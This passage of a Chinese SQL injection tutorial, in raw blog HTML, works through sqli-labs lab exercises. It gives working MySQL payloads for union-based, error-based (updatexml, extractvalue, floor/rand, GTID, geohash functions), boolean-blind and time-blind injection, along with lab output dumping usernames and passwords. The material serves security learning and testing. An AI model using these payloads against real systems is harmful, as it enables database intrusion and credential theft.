class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">可控参数改变 (类似于?id=1,2,3,4) 能否影响页面结果</span><br><span class=\"line\">输入的SQL语句是否能报错，通过数据库报错看到数据库一些语句的痕迹</span><br><span class=\"line\">?id=1&#x27;   报错说明是整形注入 &#x27;</span><br><span class=\"line\">输入的SQL语句能否不报错，语句是否可以成功闭合</span><br><span class=\"line\">information_schema 包含当前数据库表名</span><br><span class=\"line\">tables 数据库中所有表，通过table_schema 和table_name 确定</span><br><span class=\"line\">通过union同时执行两条语句，但需要保证前一个表和后一个表字段数一样</span><br><span class=\"line\">因此需要判断前一个表有几列</span><br><span class=\"line\">通过#或者--+ 将后面的语句注释，使其只执行前面的语句，通过HTML实体编码将其编码#---%23</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=4 union select 1,2,3,4 #</span><br><span class=\"line\">如果提示有different columns，说明不匹配，可以使用枚举</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=4 union select 1,2,3 # </span><br><span class=\"line\">这里的1,2,3只是用于占位</span><br><span class=\"line\">将id改为前表不存在的值，使其查询结果不显示前表，同时可以查出回显位置</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,2,3 # </span><br><span class=\"line\">将后面占位符改为需要查询的语句，同时可以调换位置使其输出在正确的位置</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,user(),3 %23</span><br><span class=\"line\">寻找数据库名字</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,schema_name,3 from information_schema.schemata %23</span><br><span class=\"line\">此时只能查询出一条语句，可以使用group_concat()拼接不同列的数据</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata %23</span><br><span class=\"line\">查询当前数据库</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,database(),3  %23</span><br><span class=\"line\">查询当前数据有有哪些表，可以使用group_concat或concat,使用concat需要使用limit限制每次出数据的个数</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(table,name),3 from information_schema.tables where table_schema = database() %23</span><br><span class=\"line\">查询表有哪些字段</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns  where table_schema = database() and table_name=&#x27;users&#x27; %23</span><br><span class=\"line\">查询用户名密码</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1, group_concat(username),group_concat(password) from security.users %23</span><br><span class=\"line\">以human_read输出user_name和password</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1, group_concat(concat_ws(&#x27;:&#x27;,username,password)),3 from security.users %23</span><br></pre></td></tr></table></figure>\n<p>2. 什么类型注入</p>\n<p>3. 语句是否能够被恶意修改 — 第二要素</p>\n<p>4. 是否能够成功执行 — 第三要素</p>\n<p>5. 获取想要数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.判断是否是整形注入，即加&#x27;判断是否可以闭合&#x27;</span><br><span class=\"line\">2.判断输入是否可以影响输出 ?id=1 and 0  ?id=1 and 1 尝试使其不报错</span><br><span class=\"line\">3.判断表有几列 union select 1,2,3 %23 或者使用order by ，按照第x列排序，可以使用二分法依次查找列数</span><br><span class=\"line\">4.使用?id=1 and 0 union select 1,2,3 %23，其中1,2,3可以用需要查询的信息替换 database()</span><br><span class=\"line\">5.查询表的详细信息?id=1 and 0 union select 1,group_concat(table_name),3  from information_schema.tables where table_schema = database() %23</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>order by 探测列名原理：</strong></p>\n<p><strong>order by 后可以加列名，列号。比如 order by 3，按照第三列排序，因此如果第三列不存在会报错，我们可以利用这点探测列数</strong></p>\n<h5 id=\"字符型注入\"><a class=\"markdownIt-Anchor\" href=\"#字符型注入\">#</a> 字符型注入</h5>\n<p>和数字型区别：接收的参数是否有’’ ,id='<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi><msup><mi>d</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mtext>字符型，</mtext><mi>i</mi><mi>d</mi><mo>=</mo></mrow><annotation encoding=\"application/x-tex\">id&#x27;字符型，id=</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.751892em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">字</span><span class=\"mord cjk_fallback\">符</span><span class=\"mord cjk_fallback\">型</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span></span></span>id 数字型</p>\n<p>也可以通过报错信息查看，如果在 limit 附近报错，说明是数字型，如果在 $id 中报错说明是字符型，因为多了一个’</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.使用order by判断列数</span><br><span class=\"line\">?id=1&#x27; order by 3 --+</span><br><span class=\"line\">2.使用联合查询</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select user()),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:root@localhost</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">3.查找数据库中有几张表</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">提示超出一行</span><br><span class=\"line\">可以使用limit 0,1，此时报出第一张表名</span><br><span class=\"line\">或者使用group_concat</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:emails,referers,uagents,users</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">4.查找列名</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:id,username,password</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">4.查找password</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(username,0x3a,password) from users),(select database()) --+</span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4</span><br><span class=\"line\">Your Password:security</span><br></pre></td></tr></table></figure>\n<p>当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。</p>\n<p>字符型：select * from table where username=‘test’</p>\n<p>字符型注入最关键的是如何闭合 SQL 语句以及注释多余的代码</p>\n<p>查询内容为字符串时：select * from table where username = ‘test’</p>\n<p>测试：</p>\n<p>select * from table where username = ‘test and 1=1’ ，无法注入，“test and 1=1” 会被数据库当作查询的字符串</p>\n<p>select * from table where username = ‘test’ and ‘1’='1’ --’，必须闭合字符串才可以继续注入</p>\n<h5 id=\"报错注入\"><a class=\"markdownIt-Anchor\" href=\"#报错注入\">#</a> 报错注入</h5>\n<p>查询错误会输出相应的错误，查询正确没有对应输出</p>\n<h6 id=\"1st_latfromgeohashmysql57x\"><a class=\"markdownIt-Anchor\" href=\"#1st_latfromgeohashmysql57x\">#</a> 1.ST_LatFromGeoHash()（mysql&gt;=5.7.x）</h6>\n<p>计算纬度 hash 报错</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))--+</span><br><span class=\"line\">and ST_LatFromGeoHash(user())--+  //可以对于系统命令直接查询</span><br></pre></td></tr></table></figure>\n<h6 id=\"2st_longfromgeohashmysql57x\"><a class=\"markdownIt-Anchor\" href=\"#2st_longfromgeohashmysql57x\">#</a> 2.ST_LongFromGeoHash（mysql&gt;=5.7.x）</h6>\n<p>payload</p>\n<p>#同 8 ，都使用了嵌套查询</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and ST_LongFromGeoHash(concat(0x7e,(select user()),0x7e))--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"3gtid-mysql-56x-显错200\"><a class=\"markdownIt-Anchor\" href=\"#3gtid-mysql-56x-显错200\">#</a> 3.GTID (MySQL&gt;= 5.6.X - 显错 &lt;=200)</h6>\n<p>0x01 GTID</p>\n<p>GTID 是 MySQL 数据库每次提交事务后生成的一个全局事务标识符，GTID 不仅在本服务器上是唯一的，其在复制拓扑中也是唯一的</p>\n<h6 id=\"gtid_subset-和-gtid_subtract函数\"><a class=\"markdownIt-Anchor\" href=\"#gtid_subset-和-gtid_subtract函数\">#</a> GTID_SUBSET () 和 GTID_SUBTRACT () 函数</h6>\n<p>0X02 函数详解</p>\n<p>GTID_SUBSET () 和 GTID_SUBTRACT () 函数，我们知道他的输入值是 GTIDset ，当输入有误时，就会报错</p>\n<p>GTID_SUBSET (set1 , set2) - 若在 set1 中的 GTID，也在 set2 中，返回 true，否则返回 false ( set1 是 set2 的子集)<br>\n GTID_SUBTRACT (set1 , set2) - 返回在 set1 中，不在 set2 中的 GTID 集合 ( set1 与 set2 的差集)</p>\n<p>0x03 注入过程 (payload)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GTID_SUBSET函数</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br><span class=\"line\"> </span><br><span class=\"line\">GTID_SUBTRACT</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure>\n<p>函数都是那样，只是适用的版本不同</p>\n<h6 id=\"4floor8xmysql50\"><a class=\"markdownIt-Anchor\" href=\"#4floor8xmysql50\">#</a> 4.floor（8.x&gt;mysql&gt;5.0）</h6>\n<p>利用 select count (*),(floor (rand (0)*2)) x from table group by x，导致数据库报错，通过 concat 函数，连接注入语句与 floor (rand (0)*2) 函数，实现将注入结果与报错信息回显的注入方式。</p>\n<p>基本的查询 select 不必多说，剩下的几个关键字有 count 、group by 、floor、rand。</p>\n<p>1.rand () 函数，获取一个 0-1 之间的随机数</p>\n<p>但如果给一个固定的随机种子之后 rand (0), 每次产生的值都是一样的。也可以称之为伪随机（产生的数据都是可预知的）。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235308883-1871895582.png\" alt=\"img\"></p>\n<p>2.floor（rand（0）*2）函数</p>\n<p>floor () 函数的作用就是返回小于等于括号内该值的最大整数。</p>\n<p>而 rand () 是返回 0 到 1 之间的随机数，那么 floor（rand（0））产生的数就只是 0，这样就不能实现报错的：</p>\n<p>而 rand 产生的数乘 2 后自然是返回 0 到 2 之间的随机数，再配合 floor () 就可以产生确定的两个数了。也就是 0 和 1：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235309428-1152684208.png\" alt=\"img\"></p>\n<p>并且根据固定的随机数种子 0，他每次产生的随机数列都是相同的 0 1 1 0 1 1。</p>\n<p>3.group by 函数</p>\n<p>group by 主要用来对数据进行分组（相同的分为一组，显示相同组最前的 ID）。</p>\n<p>4.count（*）函数</p>\n<p>count（*）统计结果的记录数。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235310739-413634853.png\" alt=\"img\"></p>\n<p>5. 综合使用产生报错：</p>\n<p>select count(*),floor(rand(0)*2) x from users group by x;</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235310997-244751856.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235310997-244751856.png\" alt=\"img\"></a></p>\n<p>根据前面函数，这句话就是统计后面产生随机数的种类并计算每种数量。</p>\n<p>分别产生 0 1 1 0 1 1 ，这样 0 是 2 个，1 是 4 个，但是最后却产生了报错。</p>\n<p><strong>三、报错分析</strong></p>\n<p>这个整合然后计数的过程中，中间发生了什么我们是必须要明白的。<br>\n首先 mysql 遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 key ，一个是计数值 count (<em>)。也就对应于实验中的 user_name 和 count (</em>)。<br>\n然后<strong>在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加 1，不存在则新 建该分组。</strong></p>\n<p>然后 mysql 官方有给过提示，就是查询的时候如果使用 rand () 的话，该值会被计算多次，那这个 &quot;被计算多次&quot; 到底是什么意思，就是在使用 group by 的时候，floor (rand (0)*2) 会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，我们来看下 floor (rand (0)*2) 报错的过程就知道了，从上面的函数使用中可以看到在一次多记录的查询过程中 floor (rand (0)*2) 的值是定性的，为 011011 (这个顺序很重要)，报错实际上就是 floor (rand (0)*2) 被计算多次导致的，我们还原一下具体的查询过程：</p>\n<p>（1）查询前默认会建立空虚拟表如下图:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311248-2120506620.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311248-2120506620.png\" alt=\"img\"></a></p>\n<p>（2）取第一条记录，执行 floor (rand (0)*2)，发现结果为 0 (第一次计算),</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311467-1420082064.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311467-1420082064.png\" alt=\"img\"></a></p>\n<p>（3）查询虚拟表，发现 0 的键值不存在，则插入新的键值的时候 floor (rand (0)*2) 会被再计算一次，结果为 1 (第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311702-8360327.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311702-8360327.png\" alt=\"img\"></a></p>\n<p>（4）查询第二条记录，再次计算 floor (rand (0)*2)，发现结果为 1 (第三次计算)</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311920-791381551.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311920-791381551.png\" alt=\"img\"></a></p>\n<p>（5）查询虚表，发现 1 的键值存在，所以 floor (rand (0)<em> 2) 不会被计算第二次，直接 count (</em>) 加 1，第二条记录查询完毕，结果如下:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235312142-2071009941.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312142-2071009941.png\" alt=\"img\"></a></p>\n<p>（6）查询第三条记录，再次计算 floor (rand (0)*2)，发现结果为 0 (第 4 次计算)</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235312396-1593125203.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312396-1593125203.png\" alt=\"img\"></a></p>\n<p>（7）查询虚表，发现键值没有 0，则数据库尝试插入一条新的数据，在插入数据时 floor (rand (0)*2) 被再次计算，作为虚表的主键，其值为 1 (第 5 次计算)，</p>\n<p><a href=\"\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312660-1954097450.png\" alt=\"img\"></a></p>\n<p><strong>然而 1 这个主键已经存在于虚拟表中，而新计算的值也为 1 (主键键值必须唯一)，所以插入的时候就直接报错了。</strong></p>\n<p><strong>四、总结</strong></p>\n<p><strong>整个查询过程 floor (rand (0)*2) 被计算了 5 次，查询原数据表 3 次，所以这就是为什么数据表中需要最少 3 条数据，使用该语句才会报错的原因。</strong></p>\n<p>payload:</p>\n<p>#获取数据库版本信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取当前数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取表数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取 users 表里的段名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#payload2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select count(*) from information_schema.tables group by concat(floor(rand(0)*2),database())</span><br></pre></td></tr></table></figure>\n<h6 id=\"5st_pointfromgeohash-mysql57\"><a class=\"markdownIt-Anchor\" href=\"#5st_pointfromgeohash-mysql57\">#</a> 5.ST_Pointfromgeohash (mysql&gt;=5.7)</h6>\n<p>获取数据库版本信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash(version(),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取表数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取 users 表里的段名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &#x27;manage&#x27; limit 0,1),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取字段里面的数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,&#x27;:&#x27;,`password`) from manage),0x23)),1)--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"6-updatexml\"><a class=\"markdownIt-Anchor\" href=\"#6-updatexml\">#</a> 6 updatexml</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(1,1,1) 一共可以接收三个参数，报错位置在第二个参数</span><br><span class=\"line\">updatexml(目标文档,xpath路径,更新内容)</span><br><span class=\"line\">updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class=\"line\">xpath syntax error:&#x27;~root@localhost~&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">有一点需要注意，updatexml()能查询字符串的最大长度为32，</span><br><span class=\"line\">updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)--+</span><br><span class=\"line\"></span><br><span class=\"line\">concat是针对以行数据做的拼接，而group_concat是针对列做的数据拼接，且group_concat自动生成逗号。</span><br><span class=\"line\">concat该函数主要针对一行数据中多个字段的拼接</span><br><span class=\"line\">group_concat该函数主要争对多行数据中[单个/多个]字段的拼接</span><br></pre></td></tr></table></figure>\n<h6 id=\"7-extractvalue\"><a class=\"markdownIt-Anchor\" href=\"#7-extractvalue\">#</a> 7 extractvalue</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">extractvalue(1,1) 一共可以接收两个参数，报错位置在第二个参数</span><br><span class=\"line\">extravalue(xml标记片段,xpath表达式) 对xml文档在xpath路径进行查询的函数</span><br><span class=\"line\">报错时返回非法内容,即利用xpath路径错误报错</span><br><span class=\"line\"></span><br><span class=\"line\">extractvalue(1,concat(0x7e,(select user()),0x7e))--+</span><br><span class=\"line\">XPATH syntax error: &#x27;~root@localhost~&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">有一点需要注意，extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32,就需要用substring()函数截取，一次查看32位,或者使用limit单次查询</span><br><span class=\"line\">and extractvalue(1,concat(0x7e,substring((select group_concat(username,&quot;:&quot;,password)from users),1,32),0x7e))--+</span><br></pre></td></tr></table></figure>\n<p>报错注入总结：<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213222739771.png\" alt=\"image-20220213222739771\"></p>\n<h5 id=\"盲注\"><a class=\"markdownIt-Anchor\" href=\"#盲注\">#</a> 盲注</h5>\n<p>在 SQL 注入过程中，SQL 语句执行后，选择的数据不能回显到前端页面，此时需要利用一些</p>\n<p>方法进行判断或者尝试，这个过程称之为盲注。</p>\n<p>在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响 应时间不同）。一般情况下，盲注可分为两类：</p>\n<p>基于布尔的盲注（Boolean based）</p>\n<p>基于时间的盲注（Time based）</p>\n<p>1. 基于布尔的盲注</p>\n<p>某些场合下，页面返回的结果只有两种（正常或错误）。通过构造 SQL 判断语句，查看页 面的返回结果（True or False）来判断哪些 SQL 判断条件成立，通过此来获取数据库中的 数据。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">前一个为0，后一个为真是or=1</span><br><span class=\"line\">id=-1&#x27; or (select substr(version(),1,1)=&#x27;5&#x27;) # </span><br><span class=\"line\">或使用left截取字符</span><br><span class=\"line\">?id=1&#x27; and left(version(),1)=5--+  &#x27;</span><br><span class=\"line\">如果此时不报错或有回显，说明version的第一个字符为5</span><br><span class=\"line\">id=-1&#x27; or (select 1 from information_schema.tables where table_schema=database() and substr(table_name,1,1)=&#x27;u&#x27; limit 0,1) #   </span><br><span class=\"line\">此时不报错或有回显说明第一字符为u</span><br><span class=\"line\">或者根据ASCII值来判断</span><br><span class=\"line\">id=-1&#x27; or (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)&gt;100 #   </span><br><span class=\"line\">每次取子串，逐个获取对应的ASCII值，获取完整内容</span><br><span class=\"line\">mid(&#x27;abcd&#x27;,1,1)  //a</span><br><span class=\"line\">substring(&#x27;abcd&#x27;,1,1)  //a</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">或者使用Burp Suite  Intruder</span><br><span class=\"line\">Position  Sniper 只能设置一个变量</span><br><span class=\"line\">设置paylaod</span><br><span class=\"line\">attack后会根据设置的值发包，根据可能的Length排序找到正确的值</span><br><span class=\"line\"></span><br><span class=\"line\">Battering ram 可以接收两个参数</span><br><span class=\"line\">pitchfork 配置两个参数</span><br><span class=\"line\">cluster 组合所有可能性发包</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>根据是否有正确的回显判断</p>\n<p>2. 基于时间的盲注</p>\n<p>又称延时注入，即使用具有延时功能的函数 sleep、benchmark 等，通过判断这些函数是 否正常执行来获取数据库中的数据。</p>\n<p>和布尔盲注的区别在于，无论查询是否成功，前端的页面都一样，而布尔的前提是页面针对是否查询出来有相应的回显</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; or sleep(3) % 23</span><br><span class=\"line\">?id=1&#x27; or if((select table_name from information_schema.tables where table_schema=database() limit 0,1)&gt;0,sleep(2),0) #</span><br><span class=\"line\">根据对应的ASCII判断，如果正确停两秒</span><br><span class=\"line\">?id= 1 if((select ascii(substr(table_name,1,1))from information_scheam.tables where table_schema=database() limit 0,1)&gt;96,sleep(2),0) %23</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(3),0) --+</span><br><span class=\"line\">通过逐个字符与ASCII比对，逐个遍历出所有需要的数据</span><br><span class=\"line\">比如database()，数据库长度length(database())</span><br></pre></td></tr></table></figure>\n<p>3. 通过 python 脚本或 sqlmap 进行盲注</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span 